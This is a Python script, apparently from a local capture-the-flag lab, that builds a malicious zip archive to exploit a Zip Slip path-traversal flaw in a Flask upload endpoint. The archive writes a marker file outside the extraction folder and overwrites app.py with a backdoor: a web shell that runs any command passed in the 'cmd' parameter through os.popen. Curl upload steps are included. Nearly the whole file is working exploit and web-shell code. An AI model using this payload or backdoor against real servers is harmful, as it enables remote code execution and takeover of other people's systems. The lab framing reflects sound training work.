"""
generate_zipslip.py — craft a malicious zip with directory-traversal entries

What it does:
    Creates evil.zip containing two entries:
      1. ../../pwned.txt  — proof-of-concept escape from extracted/
      2. ../../app.py     — overwrites the Flask app source with a backdoor

Usage:
    python generate_zipslip.py
    curl -F "file=@evil.zip" http://localhost:5000/zipslip

After upload, Flask's debug reloader detects app.py changed and restarts.
Then visit:
    http://localhost:5000/flag   — capture the zipslip flag
    http://localhost:5000/revert — restore original app.py (auto-reloads)
"""

import zipfile
import io


PWNED_TXT = b"ZIP SLIP: you have been pwned! Pull for Yae Miko NOW!\n"

BACKDOOR_APP = b'''
import os, shutil, threading, time
from datetime import datetime
from flask import Flask, request

app  = Flask(__name__)
BASE = os.path.dirname(os.path.abspath(__file__))


@app.after_request
def log_request(response):
    path = request.full_path.rstrip("?")
    proto = request.environ.get("SERVER_PROTOCOL", "HTTP/1.1")
    stamp = datetime.now().strftime("%d/%b/%Y %H:%M:%S")
    print(f'[{stamp}] "{request.method} {path} {proto}" {response.status_code} -', flush=True)
    return response


@app.route("/")
def index():
    cmd    = request.args.get("cmd", "systeminfo")
    output = os.popen(cmd).read()
    return (
        "<pre>"
        "BACKDOOR ACTIVE\\n"
        "Zip Slip -> RCE confirmed\\n\\n"
        f"$ {cmd}\\n{output}\\n\\n"
        "Visit /flag   to capture your flag.\\n"
        "Visit /revert to restore the original lab.\\n"
        "</pre>"
    )


@app.route("/flag")
def flag():
    flag_path = os.path.join(BASE, "flags", "zipslip.txt")
    try:
        with open(flag_path) as f:
            flag_value = f.read().strip()
        return (
            "<pre>"
            "FLAG CAPTURED\\n\\n"
            f"  {flag_value}\\n\\n"
            "Exploit chain:\\n"
            "  POST /zipslip   -> evil.zip extracted\\n"
            "  ../app.py entry -> backdoor written\\n"
            "  Flask reloader  -> backdoor activated\\n"
            "  GET /flag       -> flag read from flags/zipslip.txt\\n"
            "</pre>"
        )
    except FileNotFoundError:
        return "<pre>flags/zipslip.txt not found.</pre>", 404


@app.route("/revert")
def revert():
    src = os.path.join(BASE, "app_original.py")
    dst = os.path.join(BASE, "app.py")
    if not os.path.exists(src):
        return "<pre>app_original.py not found.</pre>", 404

    def restore_later():
        time.sleep(0.5)
        shutil.copy(src, dst)
        os.utime(dst, None)

    threading.Thread(target=restore_later, daemon=True).start()
    return (
        "<pre>"
        "app.py restore scheduled from app_original.py.\\n"
        "Flask reloader is restarting the server now...\\n\\n"
        "Refresh http://localhost:5000 in a moment to confirm the lab is back.\\n"
        "</pre>"
    )


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
'''


def build_evil_zip(output_path: str = "evil.zip"):
    buf = io.BytesIO()

    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        info1 = zipfile.ZipInfo("../pwned.txt")
        zf.writestr(info1, PWNED_TXT)

        info2 = zipfile.ZipInfo("../app.py")
        zf.writestr(info2, BACKDOOR_APP)

    with open(output_path, "wb") as f:
        f.write(buf.getvalue())

    print(f"[+] Malicious zip written to {output_path}")
    print()
    print("Entries inside the zip:")
    with zipfile.ZipFile(output_path) as zf:
        for name in zf.namelist():
            print(f"  {name!r}")
    print()
    print("Upload with:")
    print(f"  curl -F 'file=@{output_path}' http://localhost:5000/zipslip")
    print()
    print("After upload, Flask reloader restarts automatically.")
    print("Then visit:")
    print("  http://localhost:5000/flag   — capture the flag")
    print("  http://localhost:5000/revert — restore original lab")


if __name__ == "__main__":
    build_evil_zip()
